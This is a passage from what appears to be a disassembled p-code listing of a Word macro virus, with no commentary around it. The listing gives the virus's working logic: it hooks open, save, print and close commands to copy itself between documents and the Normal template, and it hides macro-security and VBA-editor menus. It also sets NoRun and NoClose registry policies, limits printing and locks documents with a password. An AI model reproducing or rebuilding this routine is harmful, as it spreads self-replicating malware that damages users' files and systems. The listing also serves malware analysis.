' 	ArgsCall Infection 0x0000 
' Line #68:
' 	LitDI2 0x0003 
' 	Ld ActiveWindow 
' 	MemLd View 
' 	MemSt TypeOf 
' Line #69:
' 	EndSub 
' Line #70:
' Line #71:
' 	FuncDefn (Sub AutoClose())
' Line #72:
' 	OnError (Resume Next) 
' Line #73:
' 	ArgsCall Stealth 0x0000 
' Line #74:
' 	ArgsCall TempActive 0x0000 
' Line #75:
' 	ArgsCall Infection 0x0000 
' Line #76:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	Not 
' 	Ld ActiveDocument 
' 	MemLd Characters 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Ne 
' 	And 
' 	IfBlock 
' Line #77:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #78:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #79:
' 	EndIfBlock 
' Line #80:
' 	EndSub 
' Line #81:
' Line #82:
' 	FuncDefn (Sub AutoExit())
' Line #83:
' 	ArgsCall TempActive 0x0000 
' Line #84:
' 	ArgsCall Infection 0x0000 
' Line #85:
' 	EndSub 
' Line #86:
' Line #87:
' 	FuncDefn (Sub FileOpen())
' Line #88:
' 	OnError (Resume Next) 
' Line #89:
' 	Ld PWords 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ShowVisualBasicEditor 
' 	EndIf 
' Line #90:
' 	ArgsCall Stealth 0x0000 
' Line #91:
' 	ArgsCall Damt 0x0000 
' Line #92:
' 	LitDI2 0x0050 
' 	ArgsLd Dialogs 0x0001 
' 	MemLd show 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #93:
' 	ArgsCall TempActive 0x0000 
' Line #94:
' 	ArgsCall Infection 0x0000 
' Line #95:
' 	OnError (Resume Next) 
' Line #96:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #97:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #98:
' 	EndIfBlock 
' Line #99:
' 	ArgsCall Damf 0x0000 
' Line #100:
' 	EndSub 
' Line #101:
' Line #102:
' 	FuncDefn (Sub FileSave())
' Line #103:
' 	OnError (Resume Next) 
' Line #104:
' 	ArgsCall Damt 0x0000 
' Line #105:
' 	ArgsCall TempActive 0x0000 
' Line #106:
' 	ArgsCall Infection 0x0000 
' Line #107:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	Not 
' 	Ld ActiveDocument 
' 	MemLd Characters 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Ne 
' 	And 
' 	IfBlock 
' Line #108:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #109:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #110:
' 	EndIfBlock 
' Line #111:
' 	ArgsCall Damf 0x0000 
' Line #112:
' 	EndSub 
' Line #113:
' Line #114:
' 	FuncDefn (Sub FileSaveAs())
' Line #115:
' 	OnError (Resume Next) 
' Line #116:
' 	ArgsCall Damt 0x0000 
' Line #117:
' 	LitDI2 0x0054 
' 	ArgsLd Dialogs 0x0001 
' 	MemLd show 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #118:
' 	ArgsCall TempActive 0x0000 
' Line #119:
' 	ArgsCall Infection 0x0000 
' Line #120:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	Not 
' 	Ld ActiveDocument 
' 	MemLd Characters 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Ne 
' 	And 
' 	IfBlock 
' Line #121:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #122:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #123:
' 	EndIfBlock 
' Line #124:
' 	EndIfBlock 
' Line #125:
' 	ArgsCall Damf 0x0000 
' Line #126:
' 	EndSub 
' Line #127:
' Line #128:
' 	FuncDefn (Sub FileClose())
' Line #129:
' 	OnError (Resume Next) 
' Line #130:
' 	ArgsCall Damt 0x0000 
' Line #131:
' 	ArgsCall AutoClose 0x0000 
' Line #132:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #133:
' 	ArgsCall Damf 0x0000 
' Line #134:
' 	EndSub 
' Line #135:
' Line #136:
' 	FuncDefn (Sub FileNew())
' Line #137:
' 	OnError (Resume Next) 
' Line #138:
' 	LitDI2 0x004F 
' 	ArgsLd Dialogs 0x0001 
' 	MemLd show 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #139:
' 	ArgsCall TempActive 0x0000 
' Line #140:
' 	ArgsCall Infection 0x0000 
' Line #141:
' 	EndIfBlock 
' Line #142:
' 	ArgsCall Stealth 0x0000 
' Line #143:
' 	EndSub 
' Line #144:
' Line #145:
' 	FuncDefn (Sub FileNewDefault())
' Line #146:
' 	OnError (Resume Next) 
' Line #147:
' 	Ld WordBasic 
' 	ArgsMemCall FileNewDefault 0x0000 
' Line #148:
' 	ArgsCall TempActive 0x0000 
' Line #149:
' 	ArgsCall Infection 0x0000 
' Line #150:
' 	EndSub 
' Line #151:
' Line #152:
' 	FuncDefn (Sub FileExit())
' Line #153:
' 	ArgsCall TempActive 0x0000 
' Line #154:
' 	ArgsCall Infection 0x0000 
' Line #155:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	Not 
' 	Ld ActiveDocument 
' 	MemLd Characters 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Ne 
' 	And 
' 	IfBlock 
' Line #156:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #157:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #158:
' 	EndIfBlock 
' Line #159:
' 	Ld Application 
' 	ArgsMemCall Quit 0x0000 
' Line #160:
' 	EndSub 
' Line #161:
' Line #162:
' 	FuncDefn (Function Serang() As Boolean)
' Line #163:
' 	Dim 
' 	VarDefn getDate (As Date)
' Line #164:
' 	OnError (Resume Next) 
' Line #165:
' 	LitVarSpecial (False)
' 	St Serang 
' Line #166:
' 	Ld regApp 
' 	Ld regSecSet 
' 	LitStr 0x0008 "FirstRun"
' 	ArgsLd GetSetting 0x0003 
' 	St getDate 
' Line #167:
' 	Ld getDate 
' 	Ld Date 
' 	Le 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St Serang 
' 	EndIf 
' Line #168:
' 	Ld Serang 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #169:
' 	StartWithExpr 
' 	Ld System 
' 	With 
' Line #170:
' 	LitStr 0x0001 "1"
' 	LitStr 0x0000 ""
' 	Ld hklm 
' 	Ld SOM 
' 	Concat 
' 	Ld cv 
' 	Concat 
' 	LitStr 0x000C "Policies\Run"
' 	Concat 
' 	LitStr 0x0007 "NoClose"
' 	ArgsMemStWith PrivateProfileString 0x0003 
' Line #171:
' 	LitStr 0x0001 "1"
' 	LitStr 0x0000 ""
' 	Ld hklm 
' 	Ld SOM 
' 	Concat 
' 	Ld cv 
' 	Concat 
' 	LitStr 0x000C "Policies\Run"
' 	Concat 
' 	LitStr 0x0005 "NoRun"
' 	ArgsMemStWith PrivateProfileString 0x0003 
' Line #172:
' 	EndWith 
' Line #173:
' 	ArgsCall ShowMe 0x0000 
' Line #174:
' 	EndIfBlock 
' Line #175:
' 	EndFunc 
' Line #176:
' Line #177:
' 	FuncDefn (Function KeyWord() As Boolean)
' Line #178:
' 	Ld regApp 
' 	Ld regSecSet 
' 	LitStr 0x000B "UserKeyWord"
' 	ArgsLd GetSetting 0x0003 
' 	Ld MacName 
' 	Ld Ver 
' 	Concat 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St KeyWord 
' 	EndIf 
' Line #179:
' 	EndFunc 
' Line #180:
' Line #181:
' 	FuncDefn (Function KompProject(Asal, Tujuan) As Boolean)
' Line #182:
' 	OnError Salah 
' Line #183:
' 	LitVarSpecial (False)
' 	St blnMod 
' Line #184:
' 	StartForVariable 
' 	Ld Komp 
' 	EndForVariable 
' 	Ld Tujuan 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #185:
' 	Ld Komp 
' 	MemLd New 
' 	Ld MacName 
' 	Ld Ver 
' 	Concat 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St blnMod 
' 	EndIf 
' Line #186:
' 	Ld Komp 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	Paren 
' 	Ld Komp 
' 	MemLd New 
' 	LitStr 0x0013 "Reference to Normal"
' 	Ne 
' 	Paren 
' 	And 
' 	Ld Komp 
' 	MemLd New 
' 	Ld MacName 
' 	Ld Ver 
' 	Concat 
' 	Ne 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #187:
' 	Ld Komp 
' 	MemLd New 
' 	Ld Tujuan 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Ld Tujuan 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Remove 0x0001 
' Line #188:
' 	LitVarSpecial (True)
' 	St KompProject 
' Line #189:
' 	EndIfBlock 
' Line #190:
' 	StartForVariable 
' 	Ld Komp 
' 	EndForVariable 
' 	NextVar 
' Line #191:
' 	Ld blnMod 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #192:
' 	Ld Asal 
' 	Ld Tujuan 
' 	Ld MacName 
' 	Ld Ver 
' 	Concat 
' 	ArgsLd EIKModul 0x0003 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St KompProject 
' 	EndIf 
' Line #193:
' 	EndIfBlock 
' Line #194:
' 	Label Salah 
' Line #195:
' 	EndFunc 
' Line #196:
' Line #197:
' 	FuncDefn (Function PrintOke() As Boolean)
' Line #198:
' 	OnError Salah 
' Line #199:
' 	Ld KeyWord 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld GetCreator 
' 	LitVarSpecial (True)
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #200:
' 	LitVarSpecial (True)
' 	St PrintOke 
' Line #201:
' 	ElseBlock 
' Line #202:
' 	LitStr 0x000A "CountPrint"
' 	Ld CusProp 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Value 
' 	LitDI2 0x0005 
' 	Lt 
' 	IfBlock 
' Line #203:
' 	LitStr 0x000A "CountPrint"
' 	Ld CusProp 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Value 
' 	LitDI2 0x0001 
' 	Add 
' 	LitStr 0x000A "CountPrint"
' 	Ld CusProp 
' 	ArgsMemLd Item 0x0001 
' 	MemSt Value 
' Line #204:
' 	Ld regApp 
' 	Ld regSecSet 
' 	LitStr 0x0008 "CountPrt"
' 	ArgsLd GetSetting 0x0003 
' 	ArgsLd Val 0x0001 
' 	LitDI2 0x0064 
' 	Le 
' 	IfBlock 
' Line #205:
' 	Ld regApp 
' 	Ld regSecSet 
' 	LitStr 0x0008 "CountPrt"
' 	Ld regApp 
' 	Ld regSecSet 
' 	LitStr 0x0008 "CountPrt"
' 	ArgsLd GetSetting 0x0003 
' 	ArgsLd Val 0x0001 
' 	LitDI2 0x0001 
' 	Add 
' 	ArgsCall SaveSetting 0x0004 
' Line #206:
' 	LitVarSpecial (True)
' 	St PrintOke 
' Line #207:
' 	EndIfBlock 
' Line #208:
' 	EndIfBlock 
' Line #209:
' 	EndIfBlock 
' Line #210:
' 	Label Salah 
' Line #211:
' 	EndFunc 
' Line #212:
' Line #213:
' 	FuncDefn (Sub FilePrint())
' Line #214:
' 	OnError (Resume Next) 
' Line #215:
' 	Dim 
' 	VarDefn aw
' 	VarDefn s
' Line #216:
' 	Ld PrintOke 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld Now 
' 	ArgsLd Minute 0x0001 
' 	LitDI2 0x0032 
' 	Le 
' 	And 
' 	IfBlock 
' Line #217:
' 	LitDI2 0x0058 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall show 0x0000 
' Line #218:
' 	ElseBlock 
' Line #219:
' 	Ld PrintOke 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld Now 
' 	ArgsLd Minute 0x0001 
' 	LitDI2 0x0032 
' 	Gt 
' 	And 
' 	IfBlock 
' Line #220:
' 	Ld KeyWord 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0058 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall show 0x0000 
' 	Else 
' 	BoSImplicit 
' 	EndIf 
' Line #221:
' 	SetStmt 
' 	Ld ActiveWindow 
' 	MemLd ActivePane 
' 	MemLd View 
' 	Set aw 
' Line #222:
' 	SetStmt 
' 	Ld Selection 
' 	Set s 
' Line #223:
' 	LitDI2 0x0009 
' 	Ld aw 
' 	MemSt SeekView 
' Line #224:
' 	Ld TempVer 
' 	Ld Ver 
' 	Concat 
' 	LitStr 0x0006 " Virus"
' 	Concat 
' 	LitStr 0x0010 " by Lord of War "
' 	Concat 
' 	Ld s 
' 	ArgsMemCall TypeText 0x0001 
' Line #225:
' 	LitDI2 0x000A 
' 	Ld aw 
' 	MemSt SeekView 
' Line #226:
' 	LitStr 0x000E "Contact us at "
' 	Ld faxzu 
' 	Concat 
' 	Ld s 
' 	ArgsMemCall TypeText 0x0001 
' Line #227:
' 	LitDI2 0x0000 
' 	Ld aw 
' 	MemSt SeekView 
' Line #228:
' 	LitDI2 0x0058 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall show 0x0000 
' Line #229:
' 	ElseBlock 
' Line #230:
' 	LitDI2 0x0058 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Display 0x0000 
' Line #231:
' 	LitStr 0x0008 "i love u"
' 	ArgsLd LCase 0x0001 
' 	Ld ActiveDocument 
' 	MemSt Password 
' Line #232:
' 	LitStr 0x0008 "i love u"
' 	ArgsLd LCase 0x0001 
' 	Ld ActiveDocument 
' 	MemSt Password 
' Line #233:
' 	ArgsCall (Call) Earthquake 0x0000 
' Line #234:
' 	EndIfBlock 
' Line #235:
' 	EndIfBlock 
' Line #236:
' 	EndSub 
' Line #237:
' Line #238:
' 	FuncDefn (Sub FilePrintDefault())
' Line #239:
' 	ArgsCall FilePrint 0x0000 
' Line #240:
' 	EndSub 
' Line #241:
' Line #242:
' 	FuncDefn (Sub ToolsCustomizeKeyboard())
' Line #243:
' 	ArgsCall (Call) Earthquake 0x0000 
' Line #244:
' 	EndSub 
' Line #245:
' Line #246:
' 	FuncDefn (Sub ViewCode())
' Line #247:
' 	ArgsCall (Call) Earthquake 0x0000 
' Line #248:
' 	EndSub 
' Line #249:
' Line #250:
' 	FuncDefn (Sub ViewVBCode())
' Line #251:
' 	Ld PWords 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St ShowVisualBasicEditor 
' 	Else 
' 	BoSImplicit 
' 	EndIf 
' Line #252:
' 	ArgsCall (Call) Earthquake 0x0000 
' Line #253:
' 	EndSub 
' Line #254:
' Line #255:
' 	FuncDefn (Sub ToolsCustomize())
' Line #256:
' 	ArgsCall Serang 0x0000 
' Line #257:
' 	EndSub 
' Line #258:
' Line #259:
' 	FuncDefn (Sub ToolsMacro())
' Line #260:
' 	ArgsCall (Call) Earthquake 0x0000 
' Line #261:
' 	EndSub 
' Line #262:
' Line #263:
' 	FuncDefn (Sub FormatStyle())
' Line #264:
' 	Ld KeyWord 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x00B4 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall show 0x0000 
' 	Else 
' 	BoSImplicit 
' 	EndIf 
' Line #265:
' 	ArgsCall (Call) Earthquake 0x0000 
' Line #266:
' 	EndSub 
' Line #267:
' Line #268:
' 	FuncDefn (Sub ToolsRecordMacroToggle())
' Line #269:
' 	ArgsCall (Call) Earthquake 0x0000 
' Line #270:
' 	EndSub 
' Line #271:
' Line #272:
' 	FuncDefn (Sub FileTemplates())
' Line #273:
' 	ArgsCall (Call) Earthquake 0x0000 
' Line #274:
' 	EndSub 
' Line #275:
' Line #276:
' 	FuncDefn (Sub TempActive())
' Line #277:
' 	OnError (Resume Next) 
' Line #278:
' 	ArgsCall Hidden 0x0000 
' Line #279:
' 	ArgsCall Aplikasi 0x0000 
' Line #280:
' 	Ld Temp 
' 	Ld Active 
' 	ArgsLd KompProject 0x0002 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #281:
' 	ArgsCall SetCusProp 0x0000 
' Line #282:
' 	Ld MacName 
' 	Ld Active 
' 	MemLd VBProject 
' 	MemSt New 
' Line #283:
' 	Ld Active 
' 	MemLd Path 
' 	FnLen 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld Active 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #284:
' 	EndIfBlock 
' Line #285:
' 	EndSub 
' Line #286:
' Line #287:
' 	FuncDefn (Function EIKModul(Asal, Tujuan, Komp As String) As Boolean)
' Line #288:
' 	OnError Salah 
' Line #289:
' 	Ld TempPath 
' 	Ld Komp 
' 	Concat 
' 	Ld Komp 
' 	Ld Asal 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #290:
' 	Ld TempPath 
' 	Ld Komp 
' 	Concat 
' 	Ld Tujuan 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #291:
' 	LitVarSpecial (True)
' 	St EIKModul 
' Line #292:
' 	Ld TempPath 
' 	Ld Komp 
' 	Concat 
' 	ArgsCall Kill 0x0001 
' Line #293:
' 	Label Salah 
' Line #294:
' 	EndFunc 
' Line #295:
' Line #296:
' 	FuncDefn (Sub ActiveTemp())
' Line #297:
' 	OnError (Resume Next) 
' Line #298:
' 	ArgsCall Hidden 0x0000 
' Line #299:
' 	ArgsCall Aplikasi 0x0000 
' Line #300:
' 	Ld Active 
' 	Ld Temp 
' 	ArgsLd KompProject 0x0002 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #301:
' 	Ld TempVer 
' 	Ld Ver 
' 	Concat 
' 	Ld Temp 
' 	MemLd VBProject 
' 	MemSt New 
' Line #302:
' 	Ld Temp 
' 	ArgsMemCall Save 0x0000 
' Line #303:
' 	Ld regApp 
' 	Ld regSecApp 
' 	Ld Application 
' 	MemLd New 
' 	LitStr 0x0004 "True"
' 	ArgsCall SaveSetting 0x0004 
' Line #304:
' 	LitVarSpecial (True)
' 	St blnFound 
' Line #305:
' 	EndIfBlock 
' Line #306:
' 	EndSub 
' Line #307:
' Line #308:
' 	FuncDefn (Sub Unvisible())
' Line #309:
' 	OnError (Resume Next) 
' Line #310:
' 	LitStr 0x000F "Control Toolbox"
' 	ArgsLd CommandBars 0x0001 
' 	LitVarSpecial (True)
' 	ArgsCall cmdBars 0x0002 
' Line #311:
' 	LitStr 0x0005 "Forms"
' 	ArgsLd CommandBars 0x0001 
' 	LitVarSpecial (True)
' 	ArgsCall cmdBars 0x0002 
' Line #312:
' 	LitStr 0x000F "ActiveX Control"
' 	ArgsLd CommandBars 0x0001 
' 	LitVarSpecial (True)
' 	ArgsCall cmdBars 0x0002 
' Line #313:
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	LitVarSpecial (True)
' 	ArgsCall cmdBars 0x0002 
' Line #314:
' 	LitStr 0x000B "Security..."
' 	LitStr 0x0005 "Macro"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	LitVarSpecial (True)
' 	ArgsCall cmdBars 0x0002 
' Line #315:
' 	LitStr 0x000A "Options..."
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	LitVarSpecial (True)
' 	ArgsCall cmdBars 0x0002 
' Line #316:
' 	Ld CommandBars 
' 	MemLd ActiveMenuBar 
' 	LitVarSpecial (False)
' 	ArgsCall cmdBars 0x0002 
' Line #317:
' 	LitStr 0x000A "Formatting"
' 	ArgsLd CommandBars 0x0001 
' 	LitVarSpecial (False)
' 	ArgsCall cmdBars 0x0002 
' Line #318:
' 	LitStr 0x0008 "Standard"
' 	ArgsLd CommandBars 0x0001 
' 	LitVarSpecial (False)
' 	ArgsCall cmdBars 0x0002 
' Line #319:
' 	EndSub 
' Line #320:
' Line #321:
' 	FuncDefn (Sub cmdBars(cmd, blnVis As Boolean))
' Line #322:
' 	StartWithExpr 
' 	Ld cmd 
' 	With 
' Line #323:
' 	Ld blnVis 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #324:
' 	LitVarSpecial (False)
' 	MemStWith Enabled 
' Line #325:
' 	LitVarSpecial (False)
' 	MemStWith Visible 
' Line #326:
' 	LitDI2 0x0008 
' 	MemStWith Protection 
' Line #327:
' 	EndIfBlock 
' Line #328:
' 	LitDI2 0x0001 
' 	MemStWith Protection 
' Line #329:
' 	EndWith 
' Line #330:
' 	EndSub 
' Line #331:
' Line #332:
' 	FuncDefn (Sub MenuWord())
' Line #333:
' 	OnError (Resume Next) 
' Line #334:
' 	Ld NormalTemplate 
' 	St CustomizationContext 
' Line #335:
' 	ArgsCall Stealth 0x0000 
' Line #336:
' 	Ld wdKeyAlt 
' 	Ld wdKeyF8 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Disable 0x0000 
' Line #337:
' 	Ld wdKeyAlt 
' 	Ld wdKeyF11 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Disable 0x0000 
' Line #338:
' 	ArgsCall Infection 0x0000 
' Line #339:
' 	ArgsCall Unvisible 0x0000 
' Line #340:
' 	EndSub 
' Line #341:
' Line #342:
' 	FuncDefn (Sub SetCusProp())
' Line #343:
' 	OnError (Resume Next) 
' Line #344:
' 	SetStmt 
' 	Ld Active 
' 	MemLd CustomDocumentProperties 
' 	Set CusProp 
' Line #345:
' 	LitStr 0x0006 "Author"
' 	LitVarSpecial (False)
' 	LitDI2 0x0004 
' 	LitStr 0x0000 ""
' 	Ld CusProp 
' 	ArgsMemCall Add 0x0004 
' Line #346:
' 	LitStr 0x000A "CountPrint"
' 	LitVarSpecial (False)
' 	LitDI2 0x0001 
' 	LitDI2 0x0000 
' 	Ld CusProp 
' 	ArgsMemCall Add 0x0004 
' Line #347:
' 	Ld PWords 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0004 "Hany"
' 	LitStr 0x0006 "Author"
' 	Ld CusProp 
' 	ArgsMemLd Item 0x0001 
' 	MemSt Value 
' 	EndIf 
' Line #348:
' 	EndSub 
' Line #349:
' Line #350:
' 	FuncDefn (Function GetCreator() As Boolean)
' Line #351:
' 	OnError Salah 
' Line #352:
' 	ArgsCall Aplikasi 0x0000 
' Line #353:
' 	SetStmt 
' 	Ld Active 
' 	MemLd CustomDocumentProperties 
' 	Set CusProp 
' Line #354:
' 	LitStr 0x0006 "Author"
' 	Ld CusProp 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Value 
' 	LitStr 0x0004 "Hany"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St GetCreator 
' 	EndIf 
' Line #355:
' 	Label Salah 
' Line #356:
' 	EndFunc 
' Line #357:
' Line #358:
' 	FuncDefn (Function PWords() As Boolean)
' Line #359:
' 	Ld regApp 
' 	Ld regSecSet 
' 	LitStr 0x000D "AuthorKeyWord"
' 	ArgsLd GetSetting 0x0003 
' 	LitStr 0x0009 "Agustinus"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St PWords 
' 	EndIf 
' Line #360:
' 	EndFunc 
' Line #361:
' Line #362:
' 	FuncDefn (Sub OnTimer())
' Line #363:
' 	ArgsCall Serang 0x0000 
' Line #364:
' 	Ld Now 
' 	Ld TimerOn 
' 	ArgsLd TimeValue 0x0001 
' 	Add 
' 	LitStr 0x0007 "OnTimer"
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' Line #365:
' 	EndSub 
' Line #366:
' Line #367:
' 	FuncDefn (Sub FoundIt())
' Line #368:
' 	ArgsCall TempActive 0x0000 
' Line #369:
' 	LitVarSpecial (False)
' 	St blnFound 
' Line #370:
' 	EndSub 
' Line #371:
' Line #372:
' 	FuncDefn (Sub Pesan(strPesan As String, msg))
' Line #373:
' 	Dim 
' 	VarDefn A (As String) 0x0007
' Line #374:
' 	Dim 
' 	OptionBase 
' 	LitDI2 0x0003 
' 	VarDefn B
' Line #375:
' 	Dim 
' 	VarDefn x
' 	VarDefn i
' 	VarDefn j
' Line #376:
' 	Dim 
' 	VarDefn K
' 	VarDefn n
' Line #377:
' 	LitStr 0x0003 "  \"
' 	LitDI2 0x0000 
' 	ArgsSt B 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "  -  "
' 	LitDI2 0x0001 
' 	ArgsSt B 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0003 "  /"
' 	LitDI2 0x0002 
' 	ArgsSt B 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0003 "  |"
' 	LitDI2 0x0003 
' 	ArgsSt B 0x0001 
' Line #378:
' 	LitDI2 0x0000 
' 	St i 
' Line #379:
' 	Ld Bar 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld TempVer 
' 	Ld Ver 
' 	Concat 
' 	LitStr 0x0009 " Virus : "
' 	Concat 
' 	St K 
' 	Else 
' 	BoSImplicit 
' 	LitStr 0x0032 "Warning... each file can be printed 5 times only: "
' 	St K 
' 	EndIf 
' Line #380:
' 	LitStr 0x008A "                                                                                                                                          "
' 	Ld strPesan 
' 	Concat 
' 	St A 
' Line #381:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld A 
' 	FnLen 
' 	For 
' Line #382:
' 	StartForVariable 
' 	Ld n 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000A 
' 	For 
' Line #383:
' 	ArgsCall Beep 0x0000 
' Line #384:
' 	StartForVariable 
' 	Next 
' Line #385:
' 	Ld A 
' 	Ld i 
' 	ArgsLd B 0x0001 
' 	Concat 
' 	Ld msg 
' 	MemSt Caption 
' Line #386:
' 	Ld K 
' 	Ld Akhir 
' 	Ld Timer 
' 	Ld Waktu 
' 	Sub 
' 	FnInt 
' 	Sub 
' 	Concat 
' 	LitStr 0x0005 " sec "
' 	Concat 
' 	Ld i 
' 	ArgsLd B 0x0001 
' 	Concat 
' 	Ld Application 
' 	MemSt StatusBar 
' Line #387:
' 	Ld A 
' 	Ld A 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd Right$ 0x0002 
' 	St A 
' Line #388:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' Line #389:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x86A0 0x0001 
' 	For 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Next 
' Line #390:
' 	Ld Timer 
' 	Ld Waktu 
' 	Sub 
' 	Ld Akhir 
' 	Ge 
' 	Paren 
' 	Ld Timer 
' 	Ld Waktu 
' 	Sub 
' 	LitDI2 0x0000 
' 	Lt 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	GoTo done 
' 	BoS 0x0000 
' 	EndIf 
' Line #391:
' 	Ld i 
' 	LitDI2 0x0003 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0000 
' 	St i 
' 	EndIf 
' Line #392:
' 	StartForVariable 
' 	Next 
' Line #393:
' 	Label done 
' Line #394:
' 	Ld Bar 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St Bar 
' 	Else 
' 	BoSImplicit 
' 	LitDI2 0x0000 
' 	St Bar 
' 	EndIf 
' Line #395:
' 	LitStr 0x0000 ""
' 	Ld msg 
' 	MemSt Caption 
' Line #396:
' 	EndSub 
' Line #397:
' Line #398:
' 	FuncDefn (Sub Message(msg))
' Line #399:
' 	Dim 
' 	OptionBase 
' 	LitDI2 0x0008 
' 	VarDefn strPesan (As String)
' Line #400:
' 	LitStr 0x0030 "Hello.. I didn't expect to meet you here, sorry "
' 	LitDI2 0x0000 
' 	ArgsSt strPesan 0x0001 
' Line #401:
' 	LitStr 0x0042 "Warning.. one or more your Word command(s) maybe not available now"
' 	LitDI2 0x0001 
' 	ArgsSt strPesan 0x0001 
' Line #402:
' 	LitStr 0x0039 "Dear Hani.. i love u so much and i'll loving you forever "
' 	LitDI2 0x0002 
' 	ArgsSt strPesan 0x0001 
' Line #403:
' 	LitStr 0x0034 "You make me write this virus.. it's dedicated to you"
' 	LitDI2 0x0003 
' 	ArgsSt strPesan 0x0001 
' Line #404:
' 	LitStr 0x0018 "This virus is activated "
' 	Ld Date 
' 	Ld vbSunday 
' 	ArgsLd WeekDay 0x0002 
' 	LitStr 0x0006 "Sunday"
' 	LitStr 0x0006 "Monday"
' 	LitStr 0x0007 "Tuesday"
